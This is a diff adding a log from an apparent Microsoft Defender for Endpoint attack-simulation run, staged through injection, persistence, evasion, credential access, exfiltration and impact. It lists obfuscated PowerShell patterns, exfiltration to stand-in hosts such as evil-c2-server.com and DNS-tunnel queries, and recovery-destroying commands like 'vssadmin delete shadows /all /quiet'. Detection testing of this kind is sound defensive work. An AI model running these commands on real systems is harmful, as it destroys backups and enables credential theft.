@@ -1,0 +1,126 @@
+[2025-08-07 18:27:37.903] [INFO] [SEV:1] Advanced attack simulation initiated
+[2025-08-07 18:27:37.913] [INFO] [SEV:1] Target path: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733
+[2025-08-07 18:27:37.934] [INFO] [SEV:1] Attack ID: 8bdd81b5-86e8-4dd4-9613-9dfe427be5e7
+[2025-08-07 18:27:37.934] [INFO] [SEV:1] === STAGE 0: Pre-Attack Setup & MDE Detection Primer ===
+[2025-08-07 18:27:37.946] [INFO] [SEV:1] Establishing MDE visibility beacon
+[2025-08-07 18:27:38.216] [INFO] [SEV:1] MDE detection primer completed
+[2025-08-07 18:27:41.250] [ATTACK] [SEV:3] === STAGE 1: Advanced Initial Access & Execution ===
+[2025-08-07 18:27:41.260] [ATTACK] [SEV:4] Executing advanced PowerShell techniques
+[2025-08-07 18:27:41.260] [ATTACK] [SEV:1] Testing execution method: EncodedCommand
+[2025-08-07 18:27:43.879] [ATTACK] [SEV:1] Testing execution method: InvokeExpression
+[2025-08-07 18:27:44.390] [ATTACK] [SEV:1] Testing execution method: ScriptBlock
+[2025-08-07 18:27:44.901] [ATTACK] [SEV:5] Simulating advanced process injection
+[2025-08-07 18:27:44.901] [ATTACK] [SEV:1] Injection technique: DLL Injection -> explorer.exe
+[2025-08-07 18:27:44.917] [ATTACK] [SEV:1] Injection technique: PE Injection -> svchost.exe
+[2025-08-07 18:27:44.917] [ATTACK] [SEV:1] Injection technique: Thread Hijacking -> notepad.exe
+[2025-08-07 18:27:44.937] [ATTACK] [SEV:1] Injection technique: Process Hollowing -> rundll32.exe
+[2025-08-07 18:27:44.937] [ATTACK] [SEV:4] Simulating Native API usage
+[2025-08-07 18:27:45.097] [ATTACK] [SEV:3] Creating obfuscated payloads
+[2025-08-07 18:27:45.118] [ATTACK] [SEV:3] Generating obfuscated artifacts
+[2025-08-07 18:27:48.160] [PERSIST] [SEV:4] === STAGE 2: Sophisticated Persistence Mechanisms ===
+[2025-08-07 18:27:48.160] [PERSIST] [SEV:4] Establishing multi-vector registry persistence
+[2025-08-07 18:27:48.193] [PERSIST] [SEV:1] Persistence added to: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+[2025-08-07 18:27:48.193] [PERSIST] [SEV:1] Persistence added to: HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+[2025-08-07 18:27:48.209] [PERSIST] [SEV:1] Persistence added to: HKCU:\Environment
+[2025-08-07 18:27:48.211] [PERSIST] [SEV:1] Persistence added to: HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+[2025-08-07 18:27:48.211] [PERSIST] [SEV:4] Creating advanced scheduled task persistence
+[2025-08-07 18:27:48.451] [PERSIST] [SEV:1] Advanced scheduled task created: MDE_Advanced_Test_8bdd81b5
+[2025-08-07 18:27:48.461] [PERSIST] [SEV:5] Creating WMI event subscription persistence
+[2025-08-07 18:27:48.472] [PERSIST] [SEV:4] Simulating DLL hijacking setup
+[2025-08-07 18:27:48.478] [PERSIST] [SEV:1] Created hijack marker: C:\Users\Admin\AppData\Local\Temp\version.dll
+[2025-08-07 18:27:48.486] [PERSIST] [SEV:1] Created hijack marker: C:\Users\Admin\AppData\Local\Temp\mscoree.dll
+[2025-08-07 18:27:48.493] [PERSIST] [SEV:1] Created hijack marker: C:\Users\Admin\AppData\Local\Temp\cryptsp.dll
+[2025-08-07 18:27:48.500] [PERSIST] [SEV:3] Creating malicious shortcuts
+[2025-08-07 18:27:48.617] [PERSIST] [SEV:1] Malicious shortcut created in Startup folder
+[2025-08-07 18:27:48.617] [PERSIST] [SEV:3] Simulating Office persistence
+[2025-08-07 18:27:51.663] [EVASION] [SEV:5] === STAGE 3: Advanced Defense Evasion & Credential Access ===
+[2025-08-07 18:27:51.676] [EVASION] [SEV:5] Attempting to enumerate security tools
+[2025-08-07 18:27:51.696] [EVASION] [SEV:1] Enumerated security process: MsMpEng (PID: 2080)
+[2025-08-07 18:27:51.723] [EVASION] [SEV:1] Enumerated security process: SecurityHealthService (PID: 9780)
+[2025-08-07 18:27:51.733] [EVASION] [SEV:3] Executing with hidden windows
+[2025-08-07 18:27:51.750] [EVASION] [SEV:1] Hidden process started: PID 7856
+[2025-08-07 18:27:51.750] [EVASION] [SEV:4] Testing command obfuscation techniques
+[2025-08-07 18:27:51.758] [EVASION] [SEV:1] Obfuscation pattern: p^o^w^e^r^s^h^e^l^l -e^n^c JABhAD0AJwB0AGUAcwB0ACcA
+[2025-08-07 18:27:51.761] [EVASION] [SEV:1] Obfuscation pattern: cmd /c "p""o""w""e""r""s""h""e""l""l"
+[2025-08-07 18:27:51.778] [EVASION] [SEV:1] Obfuscation pattern: poWeRsHeLl -NoPrOFiLe -ExEcUtIoNpOlIcY BypAsS
+[2025-08-07 18:27:51.798] [EVASION] [SEV:1] Obfuscation pattern: c"m"d /c p"o"w"e"r"s"h"e"l"l
+[2025-08-07 18:27:51.806] [ATTACK] [SEV:5] Simulating credential access attempts
+[2025-08-07 18:27:51.817] [ATTACK] [SEV:1] LSASS enumeration: PID 896
+[2025-08-07 18:27:51.826] [ATTACK] [SEV:5] Simulating NTDS.dit access attempt
+[2025-08-07 18:27:51.832] [ATTACK] [SEV:4] Simulating APC injection
+[2025-08-07 18:27:51.842] [EVASION] [SEV:4] Testing LOLBAS execution
+[2025-08-07 18:27:51.851] [EVASION] [SEV:1] LOLBAS simulation: rundll32.exe
+[2025-08-07 18:27:51.862] [EVASION] [SEV:1] LOLBAS simulation: regsvr32.exe
+[2025-08-07 18:27:51.867] [EVASION] [SEV:1] LOLBAS simulation: mshta.exe
+[2025-08-07 18:27:51.880] [EVASION] [SEV:1] LOLBAS simulation: certutil.exe
+[2025-08-07 18:27:54.905] [RECON] [SEV:3] === STAGE 4: Advanced Discovery & Reconnaissance ===
+[2025-08-07 18:27:54.905] [RECON] [SEV:3] Performing comprehensive account discovery
+[2025-08-07 18:27:54.932] [RECON] [SEV:4] Searching for sensitive files
+[2025-08-07 18:27:55.000] [RECON] [SEV:1] Sensitive file patterns searched: 12
+[2025-08-07 18:27:55.003] [RECON] [SEV:3] Enumerating privileged groups
+[2025-08-07 18:27:55.028] [RECON] [SEV:1] Enumerated group: Administrators (Members: 5)
+[2025-08-07 18:27:55.067] [RECON] [SEV:2] Performing network configuration discovery
+[2025-08-07 18:27:55.687] [RECON] [SEV:2] Discovering system services
+[2025-08-07 18:27:55.719] [RECON] [SEV:3] Querying sensitive registry locations
+[2025-08-07 18:27:58.787] [ATTACK] [SEV:4] === STAGE 5: Lateral Movement Preparation ===
+[2025-08-07 18:27:58.791] [ATTACK] [SEV:4] Testing SMB lateral movement vectors
+[2025-08-07 18:27:58.791] [ATTACK] [SEV:1] Testing SMB access: \\localhost\C$
+[2025-08-07 18:27:58.854] [ATTACK] [SEV:1] Testing SMB access: \\127.0.0.1\ADMIN$
+[2025-08-07 18:27:58.873] [ATTACK] [SEV:1] Testing SMB access: \\AVIRUP-1\IPC$
+[2025-08-07 18:27:58.890] [ATTACK] [SEV:3] Testing WinRM capabilities
+[2025-08-07 18:27:59.586] [ATTACK] [SEV:3] Checking RDP configuration
+[2025-08-07 18:27:59.605] [ATTACK] [SEV:4] Testing WMI for lateral movement
+[2025-08-07 18:27:59.613] [ATTACK] [SEV:1] WMI Query: SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'
+[2025-08-07 18:27:59.621] [ATTACK] [SEV:1] WMI Query: SELECT * FROM Win32_Service WHERE State = 'Running'
+[2025-08-07 18:27:59.621] [ATTACK] [SEV:1] WMI Query: SELECT * FROM Win32_StartupCommand
+[2025-08-07 18:28:02.653] [EXFIL] [SEV:4] === STAGE 6: Advanced Collection & Staging ===
+[2025-08-07 18:28:02.666] [EXFIL] [SEV:3] Creating local staging directory
+[2025-08-07 18:28:02.670] [EXFIL] [SEV:3] Collecting data from local system
+[2025-08-07 18:28:02.679] [EXFIL] [SEV:4] Searching for credential stores
+[2025-08-07 18:28:02.682] [EXFIL] [SEV:1] Found credential store: C:\Users\Admin\AppData\Roaming\Microsoft\Credentials
+[2025-08-07 18:28:02.682] [EXFIL] [SEV:1] Found credential store: C:\Users\Admin\AppData\Local\Microsoft\Edge\User Data\Default
+[2025-08-07 18:28:02.700] [EXFIL] [SEV:3] Creating compressed archive for exfiltration
+[2025-08-07 18:28:02.718] [EXFIL] [SEV:1] Creating multiple archive formats
+[2025-08-07 18:28:02.765] [EXFIL] [SEV:3] Simulating automated collection script
+[2025-08-07 18:28:05.804] [EXFIL] [SEV:5] === STAGE 7: Data Exfiltration Simulation ===
+[2025-08-07 18:28:05.820] [EXFIL] [SEV:5] Simulating C2 channel exfiltration
+[2025-08-07 18:28:05.820] [EXFIL] [SEV:1] Simulating exfiltration to: https://evil-c2-server.com/upload
+[2025-08-07 18:28:06.137] [EXFIL] [SEV:1] Simulating exfiltration to: https://malicious-callback.net/data
+[2025-08-07 18:28:06.648] [EXFIL] [SEV:1] Simulating exfiltration to: https://attacker-controlled.org/exfil
+[2025-08-07 18:28:06.967] [EXFIL] [SEV:4] Testing alternative exfiltration methods
+[2025-08-07 18:28:06.983] [EXFIL] [SEV:1] Simulating DNS exfiltration
+[2025-08-07 18:28:06.992] [EXFIL] [SEV:1] DNS exfil query: RXhmaWx0cmF0ZWRfRGF0YV84YmRkOD.dns-tunnel-0.evil-dns.com
+[2025-08-07 18:28:07.305] [EXFIL] [SEV:1] DNS exfil query: FiNS04NmU4LTRkZDQtOTYxMy05ZGZl.dns-tunnel-1.evil-dns.com
+[2025-08-07 18:28:07.676] [EXFIL] [SEV:1] DNS exfil query: NDI3YmU1ZTc=.dns-tunnel-2.evil-dns.com
+[2025-08-07 18:28:07.973] [EXFIL] [SEV:4] Simulating cloud storage exfiltration
+[2025-08-07 18:28:07.978] [EXFIL] [SEV:1] Cloud exfiltration simulation: Dropbox
+[2025-08-07 18:28:07.992] [EXFIL] [SEV:1] Cloud exfiltration simulation: OneDrive
+[2025-08-07 18:28:07.992] [EXFIL] [SEV:1] Cloud exfiltration simulation: GoogleDrive
+[2025-08-07 18:28:08.005] [EXFIL] [SEV:1] Cloud exfiltration simulation: AWS S3
+[2025-08-07 18:28:08.005] [EXFIL] [SEV:4] Creating encrypted exfiltration channel
+[2025-08-07 18:28:11.054] [IMPACT] [SEV:5] === STAGE 8: Impact & Anti-Forensics ===
+[2025-08-07 18:28:11.069] [IMPACT] [SEV:5] Simulating ransomware behavior
+[2025-08-07 18:28:11.084] [IMPACT] [SEV:1] Created ransomware marker: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733\test_file.locked
+[2025-08-07 18:28:11.089] [IMPACT] [SEV:1] Created ransomware marker: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733\test_file.encrypted
+[2025-08-07 18:28:11.103] [IMPACT] [SEV:1] Created ransomware marker: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733\test_file.crypto
+[2025-08-07 18:28:11.103] [IMPACT] [SEV:1] Created ransomware marker: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733\test_file.enc
+[2025-08-07 18:28:11.117] [IMPACT] [SEV:1] Created ransomware marker: C:\Users\Admin\AppData\Local\Temp\MDEAdvancedTest_20250807182733\test_file.WNCRY
+[2025-08-07 18:28:11.122] [IMPACT] [SEV:5] Simulating system recovery inhibition
+[2025-08-07 18:28:11.135] [IMPACT] [SEV:1] Recovery inhibition command (simulated): vssadmin delete shadows /all /quiet
+[2025-08-07 18:28:11.135] [IMPACT] [SEV:1] Recovery inhibition command (simulated): wbadmin delete catalog -quiet
+[2025-08-07 18:28:11.157] [IMPACT] [SEV:1] Recovery inhibition command (simulated): bcdedit /set {default} recoveryenabled No
+[2025-08-07 18:28:11.167] [IMPACT] [SEV:1] Recovery inhibition command (simulated): bcdedit /set {default} bootstatuspolicy ignoreallfailures
+[2025-08-07 18:28:11.171] [IMPACT] [SEV:4] Simulating anti-forensic activities
+[2025-08-07 18:28:11.180] [IMPACT] [SEV:1] Simulating event log clearing: Application
+[2025-08-07 18:28:11.184] [IMPACT] [SEV:1] Simulating event log clearing: Security
+[2025-08-07 18:28:11.202] [IMPACT] [SEV:1] Simulating event log clearing: System
+[2025-08-07 18:28:11.212] [IMPACT] [SEV:1] Simulating event log clearing: Microsoft-Windows-PowerShell/Operational
+[2025-08-07 18:28:11.221] [IMPACT] [SEV:3] Simulating secure file deletion
+[2025-08-07 18:28:11.236] [IMPACT] [SEV:4] Simulating critical service disruption
+[2025-08-07 18:28:11.247] [IMPACT] [SEV:1] Target service for disruption: WinDefend (Status: Running)
+[2025-08-07 18:28:11.257] [IMPACT] [SEV:1] Target service for disruption: Sense (Status: Running)
+[2025-08-07 18:28:11.261] [IMPACT] [SEV:1] Target service for disruption: VSS (Status: Stopped)
+[2025-08-07 18:28:11.269] [IMPACT] [SEV:1] Target service for disruption: BITS (Status: Stopped)
+[2025-08-07 18:28:11.280] [IMPACT] [SEV:1] Target service for disruption: wscsvc (Status: Running)
+[2025-08-07 18:28:11.285] [INFO] [SEV:1] Generating MDE Alert Correlation Report
+[2025-08-07 18:28:11.431] [INFO] [SEV:1] Attack simulation completed successfully
